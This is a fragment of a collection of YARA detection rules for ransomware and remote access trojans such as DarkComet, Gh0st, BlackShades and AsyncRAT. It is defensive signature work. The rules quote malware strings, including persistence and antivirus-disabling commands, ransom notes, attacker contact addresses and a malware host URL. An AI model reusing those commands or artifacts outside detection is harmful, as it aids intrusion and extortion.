  "SnakeRansomware": "rule SnakeRansomware\n{\n    meta:\n        Author = \"Nishan Maharjan\"\n        Description = \"A yara rule to catch snake ransomware\"\n        Reference = \"https://medium.com/@nishanmaharjan17/malware-analysis-snake-ransomware-a0e66f487017\"\n        Data = \"15th May 2020\"\n    strings:\n        $go_build_id = \"Go build ID: \\\"X6lNEpDhc_qgQl56x4du/fgVJOqLlPCCIekQhFnHL/rkxe6tXCg56Ez88otHrz/Y-lXW-OhiIbzg3-ioGRz\\\"\"\n        $math_rand_seed_calling = { 89 C8 BB 00 CA 9A 3B 89 D1 F7 E3 81 E1 FF FF FF 3F 89 C3 01 C8 89 C6 05 00 00 1A 3D 89 04 24 69 ED 00 CA 9A 3B 01 EA 89 CD C1 F9 1F 01 EB 11 CA 81 C6 00 00 1A 3D 81 D2 EB 03 B2 A1 89 54 24 04 E8 10 62 F6 FF }\n        $encryption_function = {64 8B 0D 14 00 00 00 8B 89 00 00 00 00 3B 61 08 0F 86 38 01 00 00 83 EC 3C E8 32 1A F3 FF 8D 7C 24 28 89 E6 E8 25 EA F0 FF 8B 44 24 2C 8B 4C 24 28 89 C2 C1 E8 1F C1 E0 1F 85 C0 0F 84 FC 00 00 00 D1 E2 89 CB C1 E9 1F 09 D1 89 DA D1 E3 C1 EB 1F 89 CD D1 E1 09 D9 89 CB 81 C1 80 7F B1 D7 C1 ED 1F 81 C3 80 7F B1 D7 83 D5 0D 89 C8 BB 00 CA 9A 3B 89 D1 F7 E3 81 E1 FF FF FF 3F 89 C3 01 C8 89 C6 05 00 00 1A 3D 89 04 24 69 ED 00 CA 9A 3B 01 EA 89 CD C1 F9 1F 01 EB 11 CA 81 C6 00 00 1A 3D 81 D2 EB 03 B2 A1 89 54 24 04 E8 10 62 F6 FF 31 C0 EB 79 89 44 24 20 8B 4C 24 40 8D 14 C1 8B 1A 89 5C 24 24 8B 52 04 89 54 24 1C C7 04 24 05 00 00 00 E8 48 FE FF FF 8B 44 24 08 8B 4C 24 04 C7 04 24 00 00 00 00 8B 54 24 24 89 54 24 04 8B 5C 24 1C 89 5C 24 08 89 4C 24 0C 89 44 24 10 E8 EC DD EF FF 8B 44 24 18 8B 4C 24 14 89 4C 24 08 89 44 24 0C 8B 44 24 24 89 04 24 8B 44 24 1C 89 44 24 04 E8 68 BB F3 FF 8B 44 24 20 40}\n    condition:\n        all of them     \n}",
  "stampado_overlay": "rule stampado_overlay\n{\nmeta:\ndescription = \"Catches Stampado samples looking for \\\\r at the beginning of PE overlay section\"\nreference = \"\"\nauthor = \"Fernando Merces, FTR, Trend Micro\"\ndate = \"2016-07\"\nmd5 = \"a393b9536a1caa34914636d3da7378b5\"\nmd5 = \"dbf3707a9cd090853a11dda9cfa78ff0\"\nmd5 = \"dd5686ca7ec28815c3cf3ed3dbebdff2\"\nmd5 = \"6337f0938e4a9c0ef44ab99deb0ef466\"\n\ncondition:\npe.characteristics == 0x122 and\npe.number_of_sections == 5 and\npe.imports(\"VERSION.dll\", \"VerQueryValueW\") and uint8(pe.sections[4].raw_data_offset + pe.sections[4].raw_data_size) == 0x0d\n\n}",
  "TeslaCrypt": "rule TeslaCrypt {\nmeta:\n    description = \"Regla para detectar Tesla con md5\"\n    author = \"CCN-CERT\"\n    version = \"1.0\"\nstrings:\n    $ = { 4E 6F 77 20 69 74 27 73 20 25 49 3A 25 4D 25 70 2E 00 00 00 76 61 6C 20 69 73 20 25 64 0A 00 00 }\ncondition:\n    all of them\n}",
  "screenlocker_acroware": "rule screenlocker_acroware {\n\n   meta:\n\n      description = \"Rule to detect Acroware ScreenLocker\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-august-31st-2018-devs-on-vacation/\"\n      \n   strings:\n\n      $s1 = \"C:\\\\Users\\\\patri\\\\Documents\\\\Visual Studio 2015\\\\Projects\\\\Advanced Ransi\\\\Advanced Ransi\\\\obj\\\\Debug\\\\Advanced Ransi.pdb\" fullword ascii\n      $s2 = \"All your Personal Data got encrypted and the decryption key is stored on a hidden\" fullword ascii\n      $s3 = \"alphaoil@mail2tor.com any try of removing this Ransomware will result in an instantly \" fullword ascii\n      $s4 = \"HKEY_CURRENT_USER\\\\SoftwareE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword wide\n      $s5 = \"webserver, after 72 hours the decryption key will get removed and your personal\" fullword ascii\n      \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB ) and all of them\n}",
  "jeff_dev_ransomware": "rule jeff_dev_ransomware {\n\n   meta:\n   \n      description = \"Rule to detect Jeff DEV Ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-august-31st-2018-devs-on-vacation/\"\n      \n   strings:\n\n      $s1 = \"C:\\\\Users\\\\Umut\\\\Desktop\\\\takemeon\" fullword wide\n      $s2 = \"C:\\\\Users\\\\Umut\\\\Desktop\\\\\" fullword ascii\n      $s3 = \"PRESS HERE TO STOP THIS CREEPY SOUND AND VIEW WHAT HAPPENED TO YOUR COMPUTER\" fullword wide\n      $s4 = \"WHAT YOU DO TO MY COMPUTER??!??!!!\" fullword wide\n\n   condition:\n\n      ( uint16(0) == 0x5a4d and filesize < 5000KB ) and all of them\n}",
  "locdoor_ransomware": "rule locdoor_ransomware {\n\n   meta:\n\n      description = \"Rule to detect Locdoor/DryCry\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://twitter.com/leotpsc/status/1036180615744376832\"\n\n   strings:\n\n      $s1 = \"copy \\\"Locdoor.exe\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\temp00000000.exe\\\"\" fullword ascii\n      $s2 = \"copy wscript.vbs C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\wscript.vbs\" fullword ascii\n      $s3 = \"!! Your computer's important files have been encrypted! Your computer's important files have been encrypted!\" fullword ascii\n      $s4 = \"echo CreateObject(\\\"SAPI.SpVoice\\\").Speak \\\"Your computer's important files have been encrypted! \" fullword ascii    \n      $s5 = \"! Your computer's important files have been encrypted! \" fullword ascii\n      $s7 = \"This program is not supported on your operating system.\" fullword ascii\n      $s8 = \"echo Your computer's files have been encrypted to Locdoor Ransomware! To make a recovery go to localbitcoins.com and create a wa\" ascii\n      $s9 = \"Please enter the password.\" fullword ascii\n\n   condition:\n\n      ( uint16(0) == 0x5a4d and filesize < 600KB ) and all of them \n}",
  "screenlocker_5h311_1nj3c706": "rule screenlocker_5h311_1nj3c706 {\n\n   meta:\n\n      description = \"Rule to detect the screenlocker 5h311_1nj3c706\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://twitter.com/demonslay335/status/1038060120461266944\"\n\n   strings:\n\n      $s1 = \"C:\\\\Users\\\\Hoang Nam\\\\source\\\\repos\\\\WindowsApp22\\\\WindowsApp22\\\\obj\\\\Debug\\\\WindowsApp22.pdb\" fullword ascii\n      $s2 = \"cmd.exe /cREG add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\ActiveDesktop /v NoChangingWallPaper /t REG_DWOR\" wide\n      $s3 = \"C:\\\\Users\\\\file1.txt\" fullword wide\n      $s4 = \"C:\\\\Users\\\\file2.txt\" fullword wide\n      $s5 = \"C:\\\\Users\\\\file.txt\" fullword wide\n      $s6 = \" /v Wallpaper /t REG_SZ /d %temp%\\\\IMG.jpg /f\" fullword wide\n      $s7 = \" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\" fullword wide\n      $s8 = \"All your file has been locked. You must pay money to have a key.\" fullword wide\n      $s9 = \"After we receive Bitcoin from you. We will send key to your email.\" fullword wide\n   \n   condition:\n\n      ( uint16(0) == 0x5a4d and filesize < 200KB ) and all of them \n}",
  "shrug2_ransomware": "rule shrug2_ransomware {\n\n   meta:\n\n      description = \"Rule to detect Shrug2 ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://blogs.quickheal.com/new-net-ransomware-shrug2/\"\n       \n   strings:\n\n      $s1 = \"C:\\\\Users\\\\Gamer\\\\Desktop\\\\Shrug2\\\\ShrugTwo\\\\ShrugTwo\\\\obj\\\\Debug\\\\ShrugTwo.pdb\" fullword ascii\n      $s2 = \"http://tempacc11vl.000webhostapp.com/\" fullword wide\n      $s4 = \"Shortcut for @ShrugDecryptor@.exe\" fullword wide\n      $s5 = \"C:\\\\Users\\\\\" fullword wide\n      $s6 = \"http://clients3.google.com/generate_204\" fullword wide\n      $s7 = \"\\\\Desktop\\\\@ShrugDecryptor@.lnk\" fullword wide\n   \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB ) and all of them \n}",
  "termite_ransomware": "rule termite_ransomware {\n\n   meta:\n\n      description = \"Rule to detect Termite Ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-august-31st-2018-devs-on-vacation/\"\n      \n   strings:\n      \n      $s1 = \"C:\\\\Windows\\\\SysNative\\\\mswsock.dll\" fullword ascii\n      $s2 = \"C:\\\\Windows\\\\SysWOW64\\\\mswsock.dll\" fullword ascii\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Termite.exe\" fullword ascii\n      $s4 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Payment.exe\" fullword ascii\n      $s5 = \"C:\\\\Windows\\\\Termite.exe\" fullword ascii\n      $s6 = \"\\\\Shell\\\\Open\\\\Command\\\\\" fullword ascii\n      $s7 = \"t314.520@qq.com\" fullword ascii\n      $s8 = \"(*.JPG;*.PNG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.PNG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n      \n   condition:\n   \n      ( uint16(0) == 0x5a4d and filesize < 6000KB ) and all of them \n}",
  "win_asyncrat_j1": "rule win_asyncrat_j1 {\n\n    meta:\n        author      = \"Johannes Bader @viql\"\n        date        = \"2020-04-26\"\n        description = \"detects AsyncRAT\"\n        references  = \"https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp\"\n        tlp         = \"white\"\n\n    strings:\n        $str_anti_1 = \"VIRTUAL\" wide\n        $str_anti_2 = \"vmware\" wide\n        $str_anti_3 = \"VirtualBox\" wide\n        $str_anti_4 = \"SbieDll.dll\" wide\n\n        $str_miner_1 = \"--donate-level=\" wide\n\n        $str_b_rev_run    = \"\\\\nuR\\\\noisreVtnerruC\\\\swodniW\\\\tfosorciM\\\\erawtfoS\" wide\n        $str_b_msg_pack_1 = \"(ext8,ext16,ex32) type $c7,$c8,$c9\" wide\n        $str_b_msg_pack_2 = \"(never used) type $c1\" wide\n        $str_b_schtask_1  = \"/create /f /sc ONLOGON /RL HIGHEST /tn \\\"'\" wide\n        $str_b_schtask_2  = \"\\\"' /tr \\\"'\" wide\n\n        $str_config_1 = \"Antivirus\" wide\n        $str_config_2 = \"Pastebin\" wide\n        $str_config_3 = \"HWID\" wide\n        $str_config_4 = \"Installed\" wide\n        $str_config_5 = \"Pong\" wide\n        $str_config_6 = \"Performance\" wide\n\n    condition:\n        all of ($str_anti_*)  and \n        4 of ($str_config_*) and ( \n            all of ($str_miner_*) or \n            3 of ($str_b_*)\n        )\n        \n}",
  "BlackShades_4": "rule BlackShades_4 : rat\n{\n\tmeta:\n\t\tdescription = \"BlackShades\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-01-12\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\n\tstrings:\n\t\t$a = { 42 00 6C 00 61 00 63 00 6B 00 73 00 68 00 61 00 64 00 65 00 73 }\n\t\t$b = { 36 00 3C 00 32 00 20 00 32 00 32 00 26 00 31 00 39 00 3E 00 1D 00 17 00 17 00 1C 00 07 00 1B 00 03 00 07 00 28 00 23 00 0C 00 1D 00 10 00 1B 00 12 00 00 00 28 00 37 00 10 00 01 00 06 00 11 00 0B 00 07 00 22 00 11 00 17 00 00 00 1D 00 1B 00 0B 00 2F 00 26 00 01 00 0B }\n\t\t$c = { 62 73 73 5F 73 65 72 76 65 72 }\n\t\t$d = { 43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44 }\n\t\t$e = { 6D 6F 64 49 6E 6A 50 45 }\n\t\t$apikey = \"f45e373429c0def355ed9feff30eff9ca21eec0fafa1e960bea6068f34209439\"\n\n\tcondition:\n\t\tany of ($a, $b, $c, $d, $e) or $apikey\t\t\n}",
  "BlackShades": "rule BlackShades : Trojan\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"26/06/2013\"\n\t\tdescription=\"BlackShades Server\"\n\t\t\n\tstrings:\n\t\t$signature1={62 73 73 5F 73 65 72 76 65 72}\n\t\t$signature2={43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}\n\t\t$signature3={6D 6F 64 49 6E 6A 50 45}\n\t\t\n\tcondition:\n\t\t$signature1 and $signature2 and $signature3\n}",
  "BlackShades_25052015": "rule BlackShades_25052015\n{\n    meta:\n        author = \"Brian Wallace (@botnet_hunter)\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/PoisonIvy\"\n        ref = \"http://blog.cylance.com/a-study-in-bots-blackshades-net\"\n        family = \"blackshades\"\n\n    strings:\n        $string1 = \"bss_server\"\n        $string2 = \"txtChat\"\n        $string3 = \"UDPFlood\"\n    condition:\n        all of them\n}",
  "Bolonyokte": "rule Bolonyokte : rat \n{\n\tmeta:\n\t\tdescription = \"UnknownDotNet RAT - Bolonyokte\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-02-01\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\n\tstrings:\n\t\t$campaign1 = \"Bolonyokte\" ascii wide\n\t\t$campaign2 = \"donadoni\" ascii wide\n\t\t\n\t\t$decoy1 = \"nyse.com\" ascii wide\n\t\t$decoy2 = \"NYSEArca_Listing_Fees.pdf\" ascii wide\n\t\t$decoy3 = \"bf13-5d45cb40\" ascii wide\n\t\t\n\t\t$artifact1 = \"Backup.zip\"  ascii wide\n\t\t$artifact2 = \"updates.txt\" ascii wide\n\t\t$artifact3 = \"vdirs.dat\" ascii wide\n\t\t$artifact4 = \"default.dat\"\n\t\t$artifact5 = \"index.html\"\n\t\t$artifact6 = \"mime.dat\"\n\t\t\n\t\t$func1 = \"FtpUrl\"\n\t\t$func2 = \"ScreenCapture\"\n\t\t$func3 = \"CaptureMouse\"\n\t\t$func4 = \"UploadFile\"\n\n\t\t$ebanking1 = \"Internet Banking\" wide\n\t\t$ebanking2 = \"(Online Banking)|(Online banking)\"\n\t\t$ebanking3 = \"(e-banking)|(e-Banking)\" nocase\n\t\t$ebanking4 = \"login\"\n\t\t$ebanking5 = \"en ligne\" wide\n\t\t$ebanking6 = \"bancaires\" wide\n\t\t$ebanking7 = \"(eBanking)|(Ebanking)\" wide\n\t\t$ebanking8 = \"Anmeldung\" wide\n\t\t$ebanking9 = \"internet banking\" nocase wide\n\t\t$ebanking10 = \"Banking Online\" nocase wide\n\t\t$ebanking11 = \"Web Banking\" wide\n\t\t$ebanking12 = \"Power\"\n\n\tcondition:\n\t\tany of ($campaign*) or 2 of ($decoy*) or 2 of ($artifact*) or all of ($func*) or 3 of ($ebanking*)\n}",
  "Bozok": "rule Bozok : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Bozok\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"getVer\" nocase\n\t\t$b = \"StartVNC\" nocase\n\t\t$c = \"SendCamList\" nocase\n\t\t$d = \"untPlugin\" nocase\n\t\t$e = \"gethostbyname\" nocase\n\n\tcondition:\n\t\tall of them\n}",
  "Crimson": "rule Crimson: RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tDescription = \"Crimson Rat\"\n\t\tdate = \"2015/05\"\n\t\tref = \"http://malwareconfig.com/stats/Crimson\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"jar\"\n\n\tstrings:\n\t\t$a1 = \"com/crimson/PK\"\n\t\t$a2 = \"com/crimson/bootstrapJar/PK\"\n\t\t$a3 = \"com/crimson/permaJarMulti/PermaJarReporter$1.classPK\"\n\t\t$a4 = \"com/crimson/universal/containers/KeyloggerLog.classPK\"\n        $a5 = \"com/crimson/universal/UploadTransfer.classPK\"\n        \n\tcondition:\n        all of ($a*)\n}",
  "CyberGate": "rule CyberGate : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/CyberGate\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}\n\t\t$string2 = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}\n\t\t$string3 = \"EditSvr\"\n\t\t$string4 = \"TLoader\"\n\t\t$string5 = \"Stroks\"\n\t\t$string6 = \"####@####\"\n\t\t$res1 = \"XX-XX-XX-XX\"\n\t\t$res2 = \"CG-CG-CG-CG\"\n\n\tcondition:\n\t\tall of ($string*) and any of ($res*)\n}",
  "DarkComet_1": "rule DarkComet_1 : RAT\n{\n    meta:\n        description = \"DarkComet RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $bot1 = /(#)BOT#OpenUrl/ wide ascii\n        $bot2 = /(#)BOT#Ping/ wide ascii\n        $bot3 = /(#)BOT#RunPrompt/ wide ascii\n        $bot4 = /(#)BOT#SvrUninstall/ wide ascii\n        $bot5 = /(#)BOT#URLDownload/ wide ascii\n        $bot6 = /(#)BOT#URLUpdate/ wide ascii\n        $bot7 = /(#)BOT#VisitUrl/ wide ascii\n        $bot8 = /(#)BOT#CloseServer/ wide ascii\n\n        $ddos1 = /(D)DOSHTTPFLOOD/ wide ascii\n        $ddos2 = /(D)DOSSYNFLOOD/ wide ascii\n        $ddos3 = /(D)DOSUDPFLOOD/ wide ascii\n\n        $keylogger1 = /(A)ctiveOnlineKeylogger/ wide ascii\n        $keylogger2 = /(U)nActiveOnlineKeylogger/ wide ascii\n        $keylogger3 = /(A)ctiveOfflineKeylogger/ wide ascii\n        $keylogger4 = /(U)nActiveOfflineKeylogger/ wide ascii\n\n        $shell1 = /(A)CTIVEREMOTESHELL/ wide ascii\n        $shell2 = /(S)UBMREMOTESHELL/ wide ascii\n        $shell3 = /(K)ILLREMOTESHELL/ wide ascii\n\n    condition:\n        4 of ($bot*) or all of ($ddos*) or all of ($keylogger*) or all of ($shell*)\n}",
  "DarkComet_2": "rule DarkComet_2 : rat\n{\n\tmeta:\n\t\tdescription = \"DarkComet\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-01-12\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\n\tstrings:\n\t\t$a = \"#BEGIN DARKCOMET DATA --\"\n\t\t$b = \"#EOF DARKCOMET DATA --\"\n\t\t$c = \"DC_MUTEX-\"\n\t\t$k1 = \"#KCMDDC5#-890\"\n\t\t$k2 = \"#KCMDDC51#-890\"\n\n\tcondition:\n\t\tany of them\n}",
  "DarkComet_3": "rule DarkComet_3 : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/DarkComet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t// Versions 2x\n\t\t$a1 = \"#BOT#URLUpdate\"\n\t\t$a2 = \"Command successfully executed!\"\n\t\t$a3 = \"MUTEXNAME\" wide\n\t\t$a4 = \"NETDATA\" wide\n\t\t// Versions 3x & 4x & 5x\n\t\t$b1 = \"FastMM Borland Edition\"\n\t\t$b2 = \"%s, ClassID: %s\"\n\t\t$b3 = \"I wasn't able to open the hosts file\"\n\t\t$b4 = \"#BOT#VisitUrl\"\n\t\t$b5 = \"#KCMDDC\"\n\tcondition:\n\t\tall of ($a*) or all of ($b*)\n}",
  "DarkComet_Keylogger_File": "rule DarkComet_Keylogger_File  : RAT\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"Looks like a keylogger file created by DarkComet Malware\"\n\t\tdate = \"25.07.14\"\n\t\treference = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tscore = 50\n\tstrings:\n\t\t$magic = \"::\"\n\t\t$entry = /\\n:: [A-Z]/\n\t\t$timestamp = /\\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\\)/\n\tcondition:\n\t\t($magic at 0) and #entry > 10 and #timestamp > 10\n}",
  "DarkComet_4": "rule DarkComet_4  : RAT\n{\tmeta:\n\t\treference = \"https://github.com/bwall/bamfdetect/blob/master/BAMF_Detect/modules/yara/darkcomet.yara\"\n\tstrings:\n\t    $a1 = \"#BOT#\"\n\t    $a2 = \"WEBCAMSTOP\"\n\t    $a3 = \"UnActiveOnlineKeyStrokes\"\n\t    $a4 = \"#SendTaskMgr\"\n\t    $a5 = \"#RemoteScreenSize\"\n\t    $a6 = \"ping 127.0.0.1 -n 4 > NUL &&\"\n\tcondition:\n\t\tall of them\n}",
  "DarkComet_5": "rule DarkComet_5\n{ \n\tmeta:\n\t\tmaltype = \"DarkComet RAT\"\n\t\tauthor = \"https://github.com/reed1713\"\n\t\tdescription = \"Malware creates the MSDCSC directory, which is a common path utilized by DarkComet, as well as the mutex pattern.\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=/AppData\\\\Local\\\\Temp\\\\MSDCSC\\\\.+\\.exe/\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4674\"\n\t\t$data1=/DC_MUTEX-[0-9A-Z]{7}/\n\tcondition:\n\t\t($type and $eventid and $data) or ($type1 and $eventid1 and $data1)\n}",
  "FlyingKitten": "rule FlyingKitten : rat\n{\n    meta:\n        Author      = \"CrowdStrike, Inc\"\n        Date        = \"2014/05/13\"\n        Description = \"Flying Kitten RAT\"\n        Reference   = \"http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten\"\n\n    strings:\n        $classpath = \"Stealer.Properties.Resources.resources\"\n        $pdbstr = \"\\\\Stealer\\\\obj\\\\x86\\\\Release\\\\Stealer.pdb\"\n\n    condition:\n        all of them and uint16(0) == 0x5A4D and uint32(uint32(0x3c)) == 0x4550 and uint16(uint32(0x3C) + 0x16) & 0x2000 == 0 and ((uint16(uint32(0x3c)+24) == 0x010b and uint32(uint32(0x3c)+232) > 0) or (uint16(uint32(0x3c)+24) == 0x020b and uint32(uint32(0x3c)+248) > 0)) \n\n}",
  "APT_WIN_Gh0st_ver": "rule APT_WIN_Gh0st_ver : RAT\n{\nmeta:\n   author = \"@BryanNolen\"\n   date = \"2012-12\"\n   type = \"APT\"\n   version = \"1.1\"\n   ref = \"Detection of Gh0st RAT server DLL component\"\n   ref1 = \"http://www.mcafee.com/au/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf\"\n strings:  \n   $library = \"deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly\"\n   $capability = \"GetClipboardData\"\n   $capability1 = \"capCreateCaptureWindowA\"\n   $capability2 = \"CreateRemoteThread\"\n   $capability3 = \"WriteProcessMemory\"\n   $capability4 = \"LsaRetrievePrivateData\"\n   $capability5 = \"AdjustTokenPrivileges\"\n   $function = \"ResetSSDT\"\n   $window = \"WinSta0\\\\Default\"\n   $magic = {47 6C 6F 62 61 6C 5C [5-9] 20 25 64}    /* $magic = \"Gh0st\" */\n condition:\n   all of them\n}",
  "Gh0st": "rule Gh0st : RAT\n{\n    meta:\n        description = \"Gh0st\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $ = /(G)host/\n        $ = /(i)nflate 1\\.1\\.4 Copyright 1995-2002 Mark Adler/\n        $ = /(d)eflate 1\\.1\\.4 Copyright 1995-2002 Jean-loup Gailly/\n        $ = /(%)s\\\\shell\\\\open\\\\command/\n        $ = /(G)etClipboardData/\n        $ = /(W)riteProcessMemory/\n        $ = /(A)djustTokenPrivileges/\n        $ = /(W)inSta0\\\\Default/\n        $ = /(#)32770/\n        $ = /(#)32771/\n        $ = /(#)32772/\n        $ = /(#)32774/\n\n    condition:\n        all of them\n}",
  "gh0st": "rule gh0st\n\n{\n\nmeta:\n\tauthor = \"https://github.com/jackcr/\"\n\n   strings:\n      $a = { 47 68 30 73 74 ?? ?? ?? ?? ?? ?? ?? ?? 78 9C }\n      $b = \"Gh0st Update\"\n\n   condition:\n      any of them\n\n}",
  "gholeeV1": "rule gholeeV1\n{\n    meta:\n\t Author = \"@GelosSnake\"\n    \t Date = \"2014/08\"\n    \t Description = \"Gholee first discovered variant \"\n\t Reference = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\" \n\n    strings:\n    \t $a = \"sandbox_avg10_vc9_SP1_2011\"\n    \t $b = \"gholee\"\n\n    condition:\n    \t all of them\n}",
  "gholeeV2": "rule gholeeV2\n{\n   meta:\n\tAuthor = \"@GelosSnake\"\n\tDate = \"2015-02-12\"\n    \tDescription = \"Gholee first discovered variant \"\n\tReference = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\" \n\n   strings:\n\t$string0 = \"RichHa\"\n\t$string1 = \"         (((((                  H\" wide\n\t$string2 = \"1$1,141<1D1L1T1\\\\1d1l1t1\"\n\t$string3 = \"<8;$O' \"\n\t$string4 = \"@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]\"\n\t$string5 = \"jYPQTVTSkllZTTXRTUiHceWda/\"\n\t$string6 = \"urn:schemas-microsoft-com:asm.v1\"\n\t$string7 = \"8.848H8O8i8s8y8\"\n\t$string8 = \"wrapper3\" wide\n\t$string9 = \"pwwwwwwww\"\n\t$string10 = \"Sunday\"\n\t$string11 = \"YYuTVWh\"\n\t$string12 = \"DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN\"\n\t$string13 = \"ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt\"\n\t$string15 = \"wrapper3 Version 1.0\" wide\n\t$string16 = \"77A779\"\n\t$string17 = \"<C<G<M<R<X<\"\n\t$string18 = \"9 9-9N9X9s9\"\n\n    condition:\n\t18 of them\n}",
  "MW_gholee_v1": "rule MW_gholee_v1 : v1\n{\nmeta:\n    Author = \"@GelosSnake\"\n    description = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\"\n    date = \"2014-08\"\n    maltype = \"Remote Access Trojan\"\n    sample_filetype = \"dll\"\n    hash0 = \"48573a150562c57742230583456b4c02\"\n   \nstrings:\n    $a = \"sandbox_avg10_vc9_SP1_2011\"\n    $b = \"gholee\"\n   \ncondition:\n    all of them\n}",
  "MW_gholee_v2": "rule MW_gholee_v2 : v2\n{\nmeta:\n        author = \"@GelosSnake\"\n        date = \"2015-02-12\"\n        description = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\"\n        hash0 = \"05523761ca296ec09afdf79477e5f18d\"\n        hash1 = \"08e424ac42e6efa361eccefdf3c13b21\"\n        hash2 = \"5730f925145f1a1cd8380197e01d9e06\"\n        hash3 = \"73461c8578dd9ab86d42984f30c04610\"\n        sample_filetype = \"dll\"\nstrings:\n        $string0 = \"RichHa\"\n        $string1 = \"         (((((                  H\" wide\n        $string2 = \"1$1,141<1D1L1T1\\\\1d1l1t1\"\n        $string3 = \"<8;$O' \"\n        $string4 = \"@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]\"\n        $string5 = \"jYPQTVTSkllZTTXRTUiHceWda/\"\n        $string6 = \"urn:schemas-microsoft-com:asm.v1\"\n        $string7 = \"8.848H8O8i8s8y8\"\n        $string8 = \"wrapper3\" wide\n        $string9 = \"pwwwwwwww\"\n        $string10 = \"Sunday\"\n        $string11 = \"YYuTVWh\"\n        $string12 = \"DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN\"\n        $string13 = \"ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt\"\n        $string15 = \"wrapper3 Version 1.0\" wide\n        $string16 = \"77A779\"\n        $string17 = \"<C<G<M<R<X<\"\n        $string18 = \"9 9-9N9X9s9\"\ncondition:\n        18 of them\n}",
  "glassrat": "rule glassrat: RAT\n{\n   meta:\n        author = \"Brian Wallace @botnet_hunter\"\n   strings:\n    \t$a = \"PostQuitMessage\"\n        $b = \"pwlfnn10,gzg\"\n        $c = \"update.dll\"\n        $d = \"_winver\"\n   condition:\n    \tall of them\n\n}",
